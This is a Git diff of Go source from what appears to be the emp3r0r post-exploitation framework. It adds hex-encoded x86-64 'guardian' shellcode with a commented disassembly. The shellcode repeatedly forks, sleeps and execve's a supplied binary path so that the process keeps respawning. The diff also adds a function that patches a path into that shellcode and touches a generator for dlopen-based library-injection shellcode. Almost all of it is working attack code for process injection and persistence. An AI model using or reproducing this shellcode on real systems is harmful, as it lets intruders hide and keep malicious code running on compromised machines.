@@ -7,7 +7,6 @@ import (
 	"log"
 	"strings"
 
-	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
@@ -26,12 +25,72 @@ var (
 		// "cc" + // int3
 		"ffd0" + // movabs rax, 0x7f040c32d930; call rax
 		"cc" // int3
-	guardian_shellcode = emp3r0r_data.GuardianShellcode
+
+		// GuardianShellcode
+		/*
+			0x00000000   2                     31c0  xor eax, eax
+			0x00000002   2                     31ff  xor edi, edi
+			0x00000004   2                     b039  mov al, 0x39
+			0x00000006   2                     0f05  syscall
+			0x00000008   4                 4883f800  cmp rax, 0
+			0x0000000c   2                     7f44  jg 0x52
+			0x0000000e   2                     31c0  xor eax, eax
+			0x00000010   2                     31ff  xor edi, edi
+			0x00000012   2                     b039  mov al, 0x39
+			0x00000014   2                     0f05  syscall
+			0x00000016   4                 4883f800  cmp rax, 0
+			0x0000001a   2                     7425  je 0x41
+			0x0000001c   2                     31ff  xor edi, edi
+			0x0000001e   3                   4889c7  mov rdi, rax
+			0x00000021   2                     31f6  xor esi, esi
+			0x00000023   2                     31d2  xor edx, edx
+			0x00000025   3                   4d31d2  xor r10, r10
+			0x00000028   2                     31c0  xor eax, eax
+			0x0000002a   2                     b03d  mov al, 0x3d
+			0x0000002c   2                     0f05  syscall
+			0x0000002e   2                     31c0  xor eax, eax
+			0x00000030   2                     b023  mov al, 0x23
+			0x00000032   2                     6a0a  push 0xa
+			0x00000034   2                     6a14  push 0x14
+			0x00000036   3                   4889e7  mov rdi, rsp
+			0x00000039   2                     31f6  xor esi, esi
+			0x0000003b   2                     31d2  xor edx, edx
+			0x0000003d   2                     0f05  syscall
+			0x0000003f   2                     e2cd  loop 0xe
+			0x00000041   2                     31d2  xor edx, edx
+			0x00000043   2                     31c0  xor eax, eax
+			0x00000045   1                       52  push rdx
+			0x00000046   1                       cc  int3
+			0x00000047   1                       52  push rdx
+			0x00000048   1                       57  push rdi
+			0x00000049   3                   4889e6  mov rsi, rsp
+			0x0000004c   2                     6a3b  push 0x3b
+			0x0000004e   1                       58  pop rax
+			0x0000004f   1                       99  cdq
+			0x00000050   2                     0f05  syscall
+			0x00000052   1                       cc  int3
+		*/
+	guardian_shellcode = "31c031ffb0390f054883f8007f4431c031ffb0390f054883f800742531ff4889c731f631d24d31d231c0b03d0f0531c0b0236a0a6a144889e731f631d20f05e2cd31d231c052" + "filename" +
+		"52574889e66a3b58990f05cc"
 )
+
+// path: eg. /usr/bin/ps
+func gen_guardian_shellcode(path string) (shellcode string) {
+	push_filename_hex := push_filename_asm(path)
+	if push_filename_hex == "" {
+		log.Printf("push_filename_asm failed")
+		return
+	}
+
+	shellcode = strings.ReplaceAll(guardian_shellcode, "filename", push_filename_hex)
+	log.Printf("gen_guardian_shellcode:\n%s", shellcode)
+
+	return
+}
 
 // dlopen_addr: eg. 30d9320c047f
 // path: eg. /usr/lib/x86_64-linux-gnu/libc++.so.1
-func gen_dlopen_shellcode(path string, dlopen_addr int64) (shelcode string) {
+func gen_dlopen_shellcode(path string, dlopen_addr int64) (shellcode string) {
 	b := make([]byte, 8)
 	binary.LittleEndian.PutUint64(b, uint64(dlopen_addr))
 	dlopen_addr_hex := hex.EncodeToString(b)
@@ -42,8 +101,8 @@ func gen_dlopen_shellcode(path string, dlopen_addr int64) (shelcode string) {
 	}
 
 	s1 := strings.ReplaceAll(dlopen_shellcode, "filename", push_filename_hex)
-	shelcode = strings.ReplaceAll(s1, "30d9320c047f0000", dlopen_addr_hex)
-	log.Printf("gen_dlopen_shellcode:\n%s", shelcode)
+	shellcode = strings.ReplaceAll(s1, "30d9320c047f0000", dlopen_addr_hex)
+	log.Printf("gen_dlopen_shellcode:\n%s", shellcode)
 
 	return
 }
